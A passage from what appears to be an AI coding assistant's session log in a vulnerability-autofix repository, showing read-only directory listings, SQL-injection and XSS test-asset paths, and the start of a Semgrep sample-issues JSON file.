main/java/SQLInjectionExample.java"},{"relPath":"consumers/analyzer/tests/assets/java/sqli/one-tainted-var-add-batch-multiple-calls/source/src/main/java/SQLInjectionExample.java"},{"relPath":"consumers/analyzer/tests/assets/java/sqli/mobb-1456/source/src/main/java/SQLInjectionExample.java"},{"relPath":"consumers/analyzer/tests/assets/java/sqli/mobb-1434/source/src/main/java/SQLInjectionExample.java"},{"relPath":"consumers/analyzer/tests/assets/java/sqli/mobb-1401/source/src/main/java/SQLInjectionExample.java"},{"relPath":"consumers/analyzer/tests/assets/java/sqli/mobb-1396/source/src/main/java/SQLInjectionExample.java"},{"relPath":"consumers/analyzer/tests/assets/java/pt/get-original-filename/source/src/main/java/app/ExampleController2.java"},{"relPath":"pycommon/tests/assets/space-in-path/source/src/main/java/Dir With Spaces And Special Characters *!?\\"'%20/SQLInjectionExample.java"},{"relPath":"pycommon/tests/assets/one-tainted-var/source/src/main/java/SQLInjectionExample.java"},{"relPath":"pycommon/tests/assets/em-one-var/source/src/main/java/SQLInjectionExample.java"},{"relPath":"pycommon/tests/assets/em-one-var-checkmarx-cli-json/source/src/main/java/SQLInjectionExample.java"},{"relPath":"consumers/analyzer/tests/assets/java/xss/Spring-return/source/src/main/java/app/ExampleId.java"},{"relPath":"consumers/analyzer/tests/assets/java/xss/Spring-return/source/src/main/java/app/ExampleController2.java"},{"relPath":"consumers/analyzer/tests/assets/java/xss/Spring-return/source/src/main/java/app/ExampleArgument.java"},{"relPath":"consumers/analyzer/tests/assets/java/xss/Spring-return-no-patcher/source/src/main/java/app/ExampleController2.java"},{"relPath":"consumers/analyzer/tests/assets/java/xss/Spring-ResponseEntity-ok/source/src/main/java/app/ExampleController.java"},{"relPath":"consumers/analyzer/tests/assets/java/xss/Spring-ResponseEntity-ok-RequestBody/source/src/main/java/app/ExampleController.java"},{"relPath":"consumers/analyzer/tests/assets/java/xss/Spring-ResponseEntity-body/source/src/main/java/app/ExampleController.java"},{"relPath":"consumers/analyzer/tests/assets/java/sqli/two-tainted-vars/source/src/main/java/SQLInjectionExample.java"},{"relPath":"consumers/analyzer/tests/assets/java/sqli/one-tainted-var/source/src/main/java/SQLInjectionExample.java"},{"relPath":"consumers/analyzer/tests/assets/java/sqli/one-tainted-var-statement-before-query/source/src/main/java/SQLInjectionExample.java"},{"relPath":"consumers/analyzer/tests/assets/java/sqli/one-tainted-var-query-inline-execute/source/src/main/java/SQLInjectionExample.java"},{"relPath":"consumers/analyzer/tests/assets/java/sqli/one-tainted-var-prepared-statement/source/src/main/java/SQLInjectionExample.java"},{"relPath":"consumers/analyzer/tests/assets/java/sqli/one-tainted-var-int/source/src/main/java/SQLInjectionExample.java"},{"relPath":"consumers/analyzer/tests/assets/java/sqli/one-tainted-var-complex-string/source/src/main/java/SQLInjectionExample.java"},{"relPath":"consumers/analyzer/tests/assets/java/sqli/multi-var-one-tainted/source/src/main/java/SQLInjectionExample.java"},{"relPath":"consumers/analyzer/tests/assets/java/sqli/multi-var-one-tainted-question-marks/source/src/main/java/SQLInjectionExample.java"},{"relPath":"consumers/analyzer/tests/assets/java/sqli/multi-var-one-tainted-q-marks-p-statement/source/src/main/java/SQLInjectionExample.java"},{"relPath":"consumers/analyzer/tests/assets/java/sqli/multi-var-one-tainted-prepared-statement/source/src/main/java/SQLInjectionExample.java"},{"relPath":"consumers/analyzer/tests/assets/java/sqli/multi-var-nested-tainted/source/src/main/java/SQLInjectionExample.java"},{"relPath":"consumers/analyzer/tests/assets/java/sqli/multi-var-nested-string-tainted/source/src/main/java/SQLInjectionExample.java"},{"relPath":"consumers/analyzer/tests/assets/java/sqli/execute-params/source/src/main/java/SQLInjectionExample.java"},{"relPath":"consumers/analyzer/tests/assets/java/sqli/em-one-var/source/src/main/java/SQLInjectionExample.java"},{"relPath":"consumers/analyzer/tests/assets/java/sqli/em-one-var-methods-chain/source/src/main/java/SQLInjectionExample.java"},{"relPath":"consumers/analyzer/tests/assets/java/sqli/em-one-var-methods-chain-no-var/source/src/main/java/SQLInjectionExample.java"},{"relPath":"consumers/analyzer/tests/assets/java/sqli/em-one-var-int/source/src/main/java/SQLInjectionExample.java"},{"relPath":"consumers/analyzer/tests/assets/java/sqli/em-one-var-int-chained/source/src/main/java/SQLInjectionExample.java"},{"relPath":"consumers/analyzer/tests/assets/java/sqli/em-one-var-complex-string/source/src/main/java/SQLInjectionExample.java"},{"relPath":"consumers/analyzer/tests/assets/java/sqli/em-one-var-checkmarx-cli-json/source/src/main/java/SQLInjectionExample.java"},{"relPath":"consumers/analyzer/tests/assets/java/sqli/em-multi-var-one-tainted/source/src/main/java/SQLInjectionExample.java"},{"relPath":"consumers/analyzer/tests/assets/java/sqli/em-multi-var-one-tainted-question-marks/source/src/main/java/SQLInjectionExample.java"},{"relPath":"consumers/analyzer/tests/assets/java/pt/file-two-args-second-tainted/source/src/main/java/app/ExampleController.java"},{"relPath":"consumers/analyzer/tests/assets/java/pt/file-two-args-first-tainted/source/src/main/java/app/ExampleController.java"},{"relPath":"consumers/analyzer/tests/assets/java/pt/file-bug-mobb-872/source/src/main/java/app/ExampleController.java"}],"totalFiles":94}]}",
        },
        "type": "TOOL_EXECUTION",
      },
      {
        "attachedFiles": [],
        "date": 2025-10-29T16:47:51.981Z,
        "text": "",
        "tokens": {
          "inputCount": 0,
          "outputCount": 0,
        },
        "tool": {
          "accepted": false,
          "name": "list_dir",
          "parameters": "{"targetDirectory":"/Users/jonathanafek/src/autofixer"}",
          "rawArguments": "{"target_directory": "/Users/jonathanafek/src/autofixer"}",
          "result": "{"directoryTreeRoot":{"absPath":"/Users/jonathanafek/src/autofixer","childrenDirs":[{"absPath":"/Users/jonathanafek/src/autofixer/__playwright__","childrenDirs":[{"absPath":"/Users/jonathanafek/src/autofixer/__playwright__/build"},{"absPath":"/Users/jonathanafek/src/autofixer/__playwright__/fixtures","fullSubtreeExtensionCounts":{".json":3,".zip":1},"numFiles":4},{"absPath":"/Users/jonathanafek/src/autofixer/__playwright__/graphql","fullSubtreeExtensionCounts":{".graphql":2},"numFiles":2},{"absPath":"/Users/jonathanafek/src/autofixer/__playwright__/helpers","fullSubtreeExtensionCounts":{".ts":5},"numFiles":5},{"absPath":"/Users/jonathanafek/src/autofixer/__playwright__/node_modules","childrenWereProcessed":true},{"absPath":"/Users/jonathanafek/src/autofixer/__playwright__/pages","fullSubtreeExtensionCounts":{".ts":9},"numFiles":9},{"absPath":"/Users/jonathanafek/src/autofixer/__playwright__/playwright-report"},{"absPath":"/Users/jonathanafek/src/autofixer/__playwright__/settings","fullSubtreeExtensionCounts":{".ts":2},"numFiles":2},{"absPath":"/Users/jonathanafek/src/autofixer/__playwright__/test-results"},{"absPath":"/Users/jonathanafek/src/autofixer/__playwright__/tests","fullSubtreeExtensionCounts":{".ts":8},"numFiles":8}],"childrenFiles":[{"name":"generated.ts"},{"name":"graphql.config.ts"},{"name":"package.json"},{"name":"playwright.config.ts"},{"name":"precommit-format.sh"},{"name":"tsconfig.json"}],"childrenWereProcessed":true,"fullSubtreeExtensionCounts":{".ts":27,".sh":1,".json":5,".zip":1,".graphql":2},"numFiles":36},{"absPath":"/Users/jonathanafek/src/autofixer/__tests__","childrenDirs":[{"absPath":"/Users/jonathanafek/src/autofixer/__tests__/build"},{"absPath":"/Users/jonathanafek/src/autofixer/__tests__/constants","fullSubtreeExtensionCounts":{".ts":1},"numFiles":1},{"absPath":"/Users/jonathanafek/src/autofixer/__tests__/files","fullSubtreeExtensionCounts":{".fpr":8,".zip":19,".json":36,".xml":3,".html":2},"numFiles":68},{"absPath":"/Users/jonathanafek/src/autofixer/__tests__/graphql","fullSubtreeExtensionCounts":{".graphql":8},"numFiles":8},{"absPath":"/Users/jonathanafek/src/autofixer/__tests__/helpers","fullSubtreeExtensionCounts":{".ts":8},"numFiles":8},{"absPath":"/Users/jonathanafek/src/autofixer/__tests__/node_modules"},{"absPath":"/Users/jonathanafek/src/autofixer/__tests__/settings","fullSubtreeExtensionCounts":{".ts":1},"numFiles":1},{"absPath":"/Users/jonathanafek/src/autofixer/__tests__/setup","fullSubtreeExtensionCounts":{".ts":1},"numFiles":1},{"absPath":"/Users/jonathanafek/src/autofixer/__tests__/tests","fullSubtreeExtensionCounts":{".ts":194,".graphql":12},"numFiles":206}],"childrenFiles":[{"name":"generated.ts"},{"name":"graphql.config.ts"},{"name":"index.d.ts"},{"name":"jest.config.ts"},{"name":"package.json"},{"name":"precommit-format.sh"},{"name":"tsconfig.json"}],"childrenWereProcessed":true,"fullSubtreeExtensionCounts":{".ts":209,".sh":1,".json":38,".fpr":8,".zip":19,".xml":3,".html":2,".graphql":20},"numFiles":300},{"absPath":"/Users/jonathanafek/src/autofixer/build","childrenDirs":[{"absPath":"/Users/jonathanafek/src/autofixer/build/litellm"}],"childrenWereProcessed":true},{"absPath":"/Users/jonathanafek/src/autofixer/clients","childrenDirs":[{"absPath":"/Users/jonathanafek/src/autofixer/clients/cli","fullSubtreeExtensionCounts":{".mjs":15,".ts":325,".md":3,".graphql":1,".json":16,".sh":2,".java":4,".js":6,".go":1,".mod":1,".fpr":1,".gitignore":1,".png":2,"":1,".snap":1},"numFiles":380},{"absPath":"/Users/jonathanafek/src/autofixer/clients/copilot_ext","fullSubtreeExtensionCounts":{".ts":13,".sh":1,".json":3},"numFiles":17},{"absPath":"/Users/jonathanafek/src/autofixer/clients/cursor_ext","fullSubtreeExtensionCounts":{".ts":9,".sh":2,".json":4,".md":1},"numFiles":16}],"childrenWereProcessed":true,"fullSubtreeExtensionCounts":{".mjs":15,".ts":347,".md":4,".graphql":1,".sh":5,".json":23,".java":4,".js":6,".go":1,".mod":1,".fpr":1,".gitignore":1,".png":2,"":1,".snap":1},"numFiles":413},{"absPath":"/Users/jonathanafek/src/autofixer/consumers","childrenDirs":[{"absPath":"/Users/jonathanafek/src/autofixer/consumers/analyzer","fullSubtreeExtensionCounts":{".py":1240,".md":156,".xml":328,"":1826,".csproj":84,".js":130,".jinja2":291,".png":126,".yml":75,".lisp":167,".sh":6,".ambr":4,".json":1738,".sql":9,".txt":17,".cs":241,".fpr":174,".http":1,".toml":1,".cfg":1,".cshtml":36,".css":7,".java":430,".xsd":3,".php":6,".jsp":8,".properties":13,".html":40,".xhtml":2,".sln":3,".yaml":4,".config":5,".aspx":4,".user":1,".go":34,".mod":12,".lock":1,".conf":1,".ini":1,".c":4,".cpp":1,".tsx":1,".ts":39,".ejs":1,".mjs":1,".cmd":1,".zip":1,".sum":2,".sqlite3":1},"numFiles":7278},{"absPath":"/Users/jonathanafek/src/autofixer/consumers/blame_ai_agent","fullSubtreeExtensionCounts":{".ts":7,".diff":6,".inference":3,".txt":3,".json":4,".sh":1,".js":1,"":1},"numFiles":26},{"absPath":"/Users/jonathanafek/src/autofixer/consumers/maintenance_service","fullSubtreeExtensionCounts":{".ts":55,".graphql":6,".json":9,".sh":1,".js":1,"":1},"numFiles":73},{"absPath":"/Users/jonathanafek/src/autofixer/consumers/notifier","fullSubtreeExtensionCounts":{".ts":36,".env":1,".tsx":30,".graphql":1,".json":5,".sh":1,".js":1,"":1},"numFiles":76},{"absPath":"/Users/jonathanafek/src/autofixer/consumers/report_init","fullSubtreeExtensionCounts":{".sh":2,".lock":1,".py":25,".conf":1,".ini":1,".md":1,".zip":1,".toml":1,"":2,".cfg":1},"numFiles":36},{"absPath":"/Users/jonathanafek/src/autofixer/consumers/sast_report_parser","fullSubtreeExtensionCounts":{".sh":2,".lock":1,".conf":1,".py":21,".md":1,".toml":1,"":2,".cfg":1},"numFiles":30},{"absPath":"/Users/jonathanafek/src/autofixer/consumers/scan_agent","fullSubtreeExtensionCounts":{".ts":6,".json":4,".sh":1,".js":1,".yaml":7,"":1},"numFiles":20},{"absPath":"/Users/jonathanafek/src/autofixer/consumers/scm_agent","fullSubtreeExtensionCounts":{".ts":12,".diff":5,".json":4,".sh":1,".js":1,"":1},"numFiles":24}],"childrenWereProcessed":true,"fullSubtreeExtensionCounts":{".py":1286,".md":158,".xml":328,"":1835,".csproj":84,".js":135,".jinja2":291,".ts":155,".env":1,".tsx":31,".png":126,".graphql":7,".yml":75,".lisp":167,".json":1764,".sh":15,".ambr":4,".sql":9,".txt":20,".cs":241,".fpr":174,".http":1,".toml":3,".cfg":3,".diff":11,".lock":3,".conf":3,".ini":2,".zip":2,".inference":3,".cshtml":36,".css":7,".yaml":11,".java":430,".xsd":3,".php":6,".jsp":8,".properties":13,".html":40,".xhtml":2,".sln":3,".config":5,".aspx":4,".user":1,".go":34,".mod":12,".c":4,".cpp":1,".ejs":1,".mjs":1,".cmd":1,".sum":2,".sqlite3":1},"numFiles":7563},{"absPath":"/Users/jonathanafek/src/autofixer/data_migrations","childrenDirs":[{"absPath":"/Users/jonathanafek/src/autofixer/data_migrations/node_modules"}],"childrenFiles":[{"name":"package.json"},{"name":"tsconfig.json"}],"childrenWereProcessed":true,"fullSubtreeExtensionCounts":{".json":2},"numFiles":2},{"absPath":"/Users/jonathanafek/src/autofixer/dist","childrenFiles":[{"name":"litellm"}],"childrenWereProcessed":true},{"absPath":"/Users/jonathanafek/src/autofixer/docs","childrenDirs":[{"absPath":"/Users/jonathanafek/src/autofixer/docs/cheat_sheets","fullSubtreeExtensionCounts":{".md":4},"numFiles":4}],"childrenFiles":[{"name":"auth.md"},{"name":"system.md"},{"name":"system.png"}],"childrenWereProcessed":true,"fullSubtreeExtensionCounts":{".md":6,".png":1},"numFiles":7},{"absPath":"/Users/jonathanafek/src/autofixer/downloads","childrenDirs":[{"absPath":"/Users/jonathanafek/src/autofixer/downloads/7edf2b0b78f5d9340ce0b7e6f0140614_"},{"absPath":"/Users/jonathanafek/src/autofixer/downloads/a4192acfbc95ee8c4e17dca9c940da6a_"},{"absPath":"/Users/jonathanafek/src/autofixer/downloads/aacc47867770f0b8078a24fe9ca384bb_"},{"absPath":"/Users/jonathanafek/src/autofixer/downloads/pip"}],"childrenFiles":[{"name":"7edf2b0b78f5d9340ce0b7e6f0140614"},{"name":"a4192acfbc95ee8c4e17dca9c940da6a"},{"name":"aacc47867770f0b8078a24fe9ca384bb"},{"name":"checkmarx"},{"name":"checkmarx.lock"},{"name":"codeql"},{"name":"codeql.lock"},{"name":"dotnet-sonarscanner"},{"name":"semgrep.lock"},{"name":"sonar"},{"name":"sonarqube.lock"}],"childrenWereProcessed":true},{"absPath":"/Users/jonathanafek/src/autofixer/infrastructure","childrenDirs":[{"absPath":"/Users/jonathanafek/src/autofixer/infrastructure/pulumi","fullSubtreeExtensionCounts":{".ts":63,".sh":3,".yaml":5,".js":4,".html":3,"":1,".json":6},"numFiles":85},{"absPath":"/Users/jonathanafek/src/autofixer/infrastructure/web-workers"}],"childrenWereProcessed":true,"fullSubtreeExtensionCounts":{".ts":63,".sh":3,".yaml":5,".js":4,".html":3,"":1,".json":6},"numFiles":85},{"absPath":"/Users/jonathanafek/src/autofixer/migrations","childrenDirs":[{"absPath":"/Users/jonathanafek/src/autofixer/migrations/default","fullSubtreeExtensionCounts":{".sql":2},"numFiles":2}],"childrenWereProcessed":true,"fullSubtreeExtensionCounts":{".sql":2},"numFiles":2},{"absPath":"/Users/jonathanafek/src/autofixer/monitoring","childrenDirs":[{"absPath":"/Users/jonathanafek/src/autofixer/monitoring/grafana","fullSubtreeExtensionCounts":{".json":3,".yaml":2},"numFiles":5},{"absPath":"/Users/jonathanafek/src/autofixer/monitoring/postgres","fullSubtreeExtensionCounts":{".sql":1},"numFiles":1},{"absPath":"/Users/jonathanafek/src/autofixer/monitoring/postgres-exporter","fullSubtreeExtensionCounts":{".yaml":1},"numFiles":1},{"absPath":"/Users/jonathanafek/src/autofixer/monitoring/prometheus","fullSubtreeExtensionCounts":{".yml":2},"numFiles":2}],"childrenFiles":[{"name":"README.md"}],"childrenWereProcessed":true,"fullSubtreeExtensionCounts":{".yaml":3,".yml":2,".sql":1,".md":1,".json":3},"numFiles":10},{"absPath":"/Users/jonathanafek/src/autofixer/node_modules","childrenWereProcessed":true},{"absPath":"/Users/jonathanafek/src/autofixer/patchino","childrenDirs":[{"absPath":"/Users/jonathanafek/src/autofixer/patchino/__pycache__"},{"absPath":"/Users/jonathanafek/src/autofixer/patchino/_samples"},{"absPath":"/Users/jonathanafek/src/autofixer/patchino/ai-playground","fullSubtreeExtensionCounts":{".ts":27,".tsx":82,".graphql":2,".css":2,".js":2,".json":5,".svg":1,".txt":1,".png":1,".ico":1,".md":1,".html":1},"numFiles":126},{"absPath":"/Users/jonathanafek/src/autofixer/patchino/app_api","fullSubtreeExtensionCounts":{".yaml":22,".graphql":1,".sh":1,"":1,".sql":36},"numFiles":61},{"absPath":"/Users/jonathanafek/src/autofixer/patchino/patchino","fullSubtreeExtensionCounts":{".py":32,".json":7,".txt":4,".jinja2":12,"":1},"numFiles":56},{"absPath":"/Users/jonathanafek/src/autofixer/patchino/tests","fullSubtreeExtensionCounts":{".py":2},"numFiles":2}],"childrenFiles":[{"name":"autoflake.cfg"},{"name":"docker-compose.yml"},{"name":"example_sampler_config.json"},{"name":"Makefile"},{"name":"poetry.lock"},{"name":"precommit-format.sh"},{"name":"pyproject.toml"},{"name":"README.md"}],"childrenWereProcessed":true,"fullSubtreeExtensionCounts":{".sh":2,".py":34,".json":13,".lock":1,".yml":1,".md":2,".txt":5,".jinja2":12,"":3,".toml":1,".cfg":1,".ts":27,".tsx":82,".graphql":3,".css":2,".js":2,".svg":1,".png":1,".ico":1,".html":1,".yaml":22,".sql":36},"numFiles":253},{"absPath":"/Users/jonathanafek/src/autofixer/pycommon","childrenDirs":[{"absPath":"/Users/jonathanafek/src/autofixer/pycommon/htmlcov"},{"absPath":"/Users/jonathanafek/src/autofixer/pycommon/pycommon","fullSubtreeExtensionCounts":{".jinja2":1,".py":76,".json":1,".graphql":1},"numFiles":79},{"absPath":"/Users/jonathanafek/src/autofixer/pycommon/scripts","fullSubtreeExtensionCounts":{".py":1},"numFiles":1},{"absPath":"/Users/jonathanafek/src/autofixer/pycommon/tests","fullSubtreeExtensionCounts":{".ambr":1,".py":60,".json":19,".java":11,".xml":14,".fpr":3,".js":1,".yaml":1,".jsp":1},"numFiles":111}],"childrenFiles":[{"name":"autoflake.cfg"},{"name":"coverage.xml"},{"name":"hasura_schema.json"},{"name":"junit-result.xml"},{"name":"Makefile"},{"name":"poetry.lock"},{"name":"precommit-format.sh"},{"name":"ptw.ini"},{"name":"pyproject.toml"},{"name":"README.md"}],"childrenWereProcessed":true,"fullSubtreeExtensionCounts":{".sh":1,".lock":1,".py":137,".ini":1,".md":1,".ambr":1,".json":20,".java":11,".xml":14,".fpr":3,".js":1,".yaml":1,".jsp":1,".toml":1,".jinja2":1,".graphql":1,"":1,".cfg":1},"numFiles":198},{"absPath":"/Users/jonathanafek/src/autofixer/scripts","childrenDirs":[{"absPath":"/Users/jonathanafek/src/autofixer/scripts/allowed-queries-generator","fullSubtreeExtensionCounts":{".ts":13,".json":2,".yaml":1,".js":6,".py":1},"numFiles":23},{"absPath":"/Users/jonathanafek/src/autofixer/scripts/analyzer","fullSubtreeExtensionCounts":{".sh":1},"numFiles":1}],"childrenFiles":[{"name":"add_issue.sh"},{"name":"add_org.sh"},{"name":"add_project.sh"},{"name":"add_user_to_project.sh"},{"name":"add_user.sh"},{"name":"check_all_services_online.py"},{"name":"check_cli_version.sh"},{"name":"cleanup_ecr.sh"},{"name":"create_api_token.sh"},{"name":"CreateToken.gql"},{"name":"deploy_broker_client.sh"},{"name":"deploy_env.sh"},{"name":"dotenv_vault_login.sh"},{"name":"download_fix_data.sh"},{"name":"extract_highlight_nodes_source.sh"},{"name":"extract_repo.sh"},{"name":"filter_ignorefiles.py"},{"name":"fix_python_codestyle.sh"},{"name":"fix_typescript_codestyle.sh"},{"name":"generate_gql_code.sh"},{"name":"generate_report.sh"},{"name":"highlight_nodes.sh"},{"name":"init.sh"},{"name":"InitOrganizationAndProject.gql"},{"name":"install_global_reqs.sh"},{"name":"install_shell_profile.sh"},{"name":"login_auth0.sh"},{"name":"opengrep_init.sh"},{"name":"optimize-vulnerability-report.sh"},{"name":"pm2_restarts.sh"},{"name":"publish_cli.sh"},{"name":"pull_env.sh"},{"name":"push_env.sh"},{"name":"python_update_lock_files.sh"},{"name":"remove_prefix.py"},{"name":"restart_failed_pr_workflows.sh"},{"name":"smart_build.sh"},{"name":"start.sh"},{"name":"test_mobb_github_action.sh"}],"childrenWereProcessed":true,"fullSubtreeExtensionCounts":{".sh":35,".py":4,".ts":13,".json":2,".yaml":1,".js":6,".gql":2},"numFiles":63},{"absPath":"/Users/jonathanafek/src/autofixer/services","childrenDirs":[{"absPath":"/Users/jonathanafek/src/autofixer/services/app","fullSubtreeExtensionCounts":{".tsx":402,".ts":256,".graphql":7,".json":4,".md":5,".png":15,".gif":4,".svg":19,".js":2,".css":2,".snap":1,".env":1,"":1,".html":1,".sh":1},"numFiles":721},{"absPath":"/Users/jonathanafek/src/autofixer/services/app_api","fullSubtreeExtensionCounts":{".sh":3,".yaml":127,".graphql":1,".md":1,"":1,".sql":1135},"numFiles":1268},{"absPath":"/Users/jonathanafek/src/autofixer/services/broker","fullSubtreeExtensionCounts":{".ts":6,".toml":1,".js":2,".json":4,".graphql":1,".sh":2,"":2,".key":1,".md":1,".template":1,".crt":1},"numFiles":22},{"absPath":"/Users/jonathanafek/src/autofixer/services/datadog_postgres_agent","fullSubtreeExtensionCounts":{".yaml":2,"":1},"numFiles":3},{"absPath":"/Users/jonathanafek/src/autofixer/services/interactive_fixer","fullSubtreeExtensionCounts":{".sh":3,".lock":1,".ini":1,".py":16,".md":1,".toml":1,"":2,".cfg":1},"numFiles":26},{"absPath":"/Users/jonathanafek/src/autofixer/services/node_general_backend","fullSubtreeExtensionCounts":{".ts":99,".json":26,".fpr":4,".zip":4,".graphql":2,".sh":1,".js":2,".xml":1,".java":2,".diff":1,"":1,".txt":1},"numFiles":144},{"absPath":"/Users/jonathanafek/src/autofixer/services/rabbitmq","fullSubtreeExtensionCounts":{"":2,".conf":1},"numFiles":3}],"childrenWereProcessed":true,"fullSubtreeExtensionCounts":{".sh":10,".lock":1,".ini":1,".py":16,".md":8,".toml":2,"":10,".cfg":1,".ts":361,".json":34,".fpr":4,".zip":4,".graphql":11,".js":6,".xml":1,".java":2,".diff":1,".txt":1,".yaml":129,".conf":1,".tsx":402,".png":15,".gif":4,".svg":19,".css":2,".snap":1,".env":1,".html":1,".key":1,".template":1,".crt":1,".sql":1135},"numFiles":2187},{"absPath":"/Users/jonathanafek/src/autofixer/tscommon","childrenDirs":[{"absPath":"/Users/jonathanafek/src/autofixer/tscommon/backend","fullSubtreeExtensionCounts":{".ts":34,".sh":1,".json":2,".graphql":2},"numFiles":39},{"absPath":"/Users/jonathanafek/src/autofixer/tscommon/components","fullSubtreeExtensionCounts":{".ts":12,".json":2,".svg":143,".js":2,".sh":1,".tsx":187},"numFiles":347},{"absPath":"/Users/jonathanafek/src/autofixer/tscommon/eslint-config-custom","fullSubtreeExtensionCounts":{".json":1,".js":1},"numFiles":2},{"absPath":"/Users/jonathanafek/src/autofixer/tscommon/frontend","fullSubtreeExtensionCounts":{".ts":1,".sh":1,".json":2},"numFiles":4},{"absPath":"/Users/jonathanafek/src/autofixer/tscommon/pulumi","fullSubtreeExtensionCounts":{".ts":5,".json":2},"numFiles":7},{"absPath":"/Users/jonathanafek/src/autofixer/tscommon/shared","fullSubtreeExtensionCounts":{".ts":14,".sh":1,".json":3},"numFiles":18},{"absPath":"/Users/jonathanafek/src/autofixer/tscommon/tsconfig","fullSubtreeExtensionCounts":{".json":4},"numFiles":4}],"childrenWereProcessed":true,"fullSubtreeExtensionCounts":{".ts":66,".json":16,".js":3,".svg":143,".sh":4,".tsx":187,".graphql":2},"numFiles":421}],"childrenFiles":[{"name":"CLAUDE.md"},{"name":"cspell.json"},{"name":"docker-bake-gha-cache.hcl"},{"name":"docker-compose.yml"},{"name":"Makefile"},{"name":"mypy_ext.ini"},{"name":"mypy.ini"},{"name":"package.json"},{"name":"pnpm-lock.yaml"},{"name":"pnpm-workspace.yaml"},{"name":"pom.xml"},{"name":"readme.md"},{"name":"static-analysis.datadog.yml"}],"childrenWereProcessed":true,"fullSubtreeExtensionCounts":{".yaml":174,".ts":1268,".json":1928,".js":163,".svg":163,".hcl":1,"":1852,".sql":1183,".sh":77,".xml":347,".lock":6,".py":1477,".ini":6,".md":182,".ambr":5,".java":447,".gql":2,".fpr":190,".zip":26,".html":47,".tsx":702,".mjs":16,".graphql":47,".csproj":84,".jinja2":304,".env":2,".png":145,".yml":80,".lisp":167,".go":35,".mod":13,".jsp":9,".toml":7,".cfg":6,".gitignore":1,".diff":12,".txt":26,".conf":4,".snap":2,".gif":4,".css":11,".key":1,".template":1,".crt":1,".cs":241,".ico":1,".http":1,".inference":3,".cshtml":36,".xsd":3,".php":6,".properties":13,".xhtml":2,".sln":3,".config":5,".aspx":4,".user":1,".c":4,".cpp":1,".ejs":1,".cmd":1,".sum":2,".sqlite3":1},"numFiles":11553}}",
        },
        "type": "TOOL_EXECUTION",
      },
      {
        "attachedFiles": [],
        "date": 2025-10-29T16:48:01.498Z,
        "text": "Checking sample files in \`patchino/_samples\`:
",
        "tokens": {
          "inputCount": 0,
          "outputCount": 0,
        },
        "tool": undefined,
        "type": "AI_RESPONSE",
      },
      {
        "attachedFiles": [],
        "date": 2025-10-29T16:48:01.585Z,
        "text": "",
        "tokens": {
          "inputCount": 0,
          "outputCount": 0,
        },
        "tool": {
          "accepted": false,
          "name": "list_dir",
          "parameters": "{"targetDirectory":"/Users/jonathanafek/src/autofixer/patchino/_samples"}",
          "rawArguments": "{"target_directory": "/Users/jonathanafek/src/autofixer/patchino/_samples"}",
          "result": "{"directoryTreeRoot":{"absPath":"/Users/jonathanafek/src/autofixer/patchino/_samples","childrenFiles":[{"name":"12e36579cafa09e786f12c4a257ca4e7.html"},{"name":"12e36579cafa09e786f12c4a257ca4e7.pkl"},{"name":"30f70896dc317958633ad1fde6d79566.html"},{"name":"30f70896dc317958633ad1fde6d79566.pkl"},{"name":"bc90c5d567713c3a4b7f2aece525894e.html"},{"name":"bc90c5d567713c3a4b7f2aece525894e.pkl"},{"name":"bdbe6ad4a26aef8ad97db6e66adad229.html"},{"name":"bdbe6ad4a26aef8ad97db6e66adad229.pkl"},{"name":"c927321cb1cce7ad39af698943333971.html"},{"name":"c927321cb1cce7ad39af698943333971.pkl"},{"name":"d1425b8d47d7597c49881ec70f4a8b75.html"},{"name":"d1425b8d47d7597c49881ec70f4a8b75.pkl"},{"name":"d71c64f91f3745e9e6f8151d2b1f1b70.html"},{"name":"d71c64f91f3745e9e6f8151d2b1f1b70.pkl"},{"name":"samples.json"}],"childrenWereProcessed":true,"fullSubtreeExtensionCounts":{".html":7,".pkl":7,".json":1},"numFiles":15}}",
        },
        "type": "TOOL_EXECUTION",
      },
      {
        "attachedFiles": [],
        "date": 2025-10-29T16:48:01.585Z,
        "text": "",
        "tokens": {
          "inputCount": 0,
          "outputCount": 0,
        },
        "tool": {
          "accepted": false,
          "name": "read_file",
          "parameters": "{"targetFile":"/Users/jonathanafek/src/autofixer/patchino/_samples/samples.json","charsLimit":100000,"effectiveUri":"file:///Users/jonathanafek/src/autofixer/patchino/_samples/samples.json"}",
          "rawArguments": "{"target_file": "/Users/jonathanafek/src/autofixer/patchino/_samples/samples.json"}",
          "result": "{"contents":"{\\n    \\"created_at\\": 1745851637,\\n    \\"issues\\": [\\n        {\\n            \\"is_public\\": true,\\n            \\"report_index\\": 8,\\n            \\"issue_object_hash\\": \\"d1425b8d47d7597c49881ec70f4a8b75\\",\\n            \\"path_to_issue_object\\": \\"d1425b8d47d7597c49881ec70f4a8b75.pkl\\",\\n            \\"path_to_issue_highlight_nodes_html\\": \\"d1425b8d47d7597c49881ec70f4a8b75.html\\",\\n            \\"sast_report_path\\": \\"../../../dataset/data/codiewio/codenire/semgrep\\",\\n            \\"source_code_path\\": \\"../../../dataset/data/codiewio/codenire/repo.zip\\",\\n            \\"sast_provider\\": \\"SEMGREP\\",\\n            \\"sast_provider_issue_name\\": \\"lang.security.audit.sqli.pgx-sqli.pgx-sqli\\",\\n            \\"sast_provider_severity\\": \\"error\\",\\n            \\"sast_provider_language\\": \\"go\\",\\n            \\"skip_issue\\": false\\n        },\\n        {\\n            \\"is_public\\": true,\\n            \\"report_index\\": 5,\\n            \\"issue_object_hash\\": \\"30f70896dc317958633ad1fde6d79566\\",\\n            \\"path_to_issue_object\\": \\"30f70896dc317958633ad1fde6d79566.pkl\\",\\n            \\"path_to_issue_highlight_nodes_html\\": \\"30f70896dc317958633ad1fde6d79566.html\\",\\n            \\"sast_report_path\\": \\"../../../dataset/data/codiewio/codenire/semgrep\\",\\n            \\"source_code_path\\": \\"../../../dataset/data/codiewio/codenire/repo.zip\\",\\n            \\"sast_provider\\": \\"SEMGREP\\",\\n            \\"sast_provider_issue_name\\": \\"lang.security.audit.sqli.pgx-sqli.pgx-sqli\\",\\n            \\"sast_provider_severity\\": \\"error\\",\\n            \\"sast_provider_language\\": \\"go\\",\\n            \\"skip_issue\\": false\\n        },\\n        {\\n            \\"is_public\\": true,\\n            \\"report_index\\": 32,\\n            \\"issue_object_hash\\": \\"c927321cb1cce7ad39af698943333971\\",\\n            \\"path_to_issue_object\\": \\"c927321cb1cce7ad39af698943333971.pkl\\",\\n            \\"path_to_issue_highlight_nodes_html\\": \\"c927321cb1cce7ad39af698943333971.html\\",\\n            \\"sast_report_path\\": \\"../../../dataset/data/canonical/jimm/semgrep\\",\\n            \\"source_code_path\\": \\"../../../dataset/data/canonical/jimm/repo.zip\\",\\n            \\"sast_provider\\": \\"SEMGREP\\",\\n            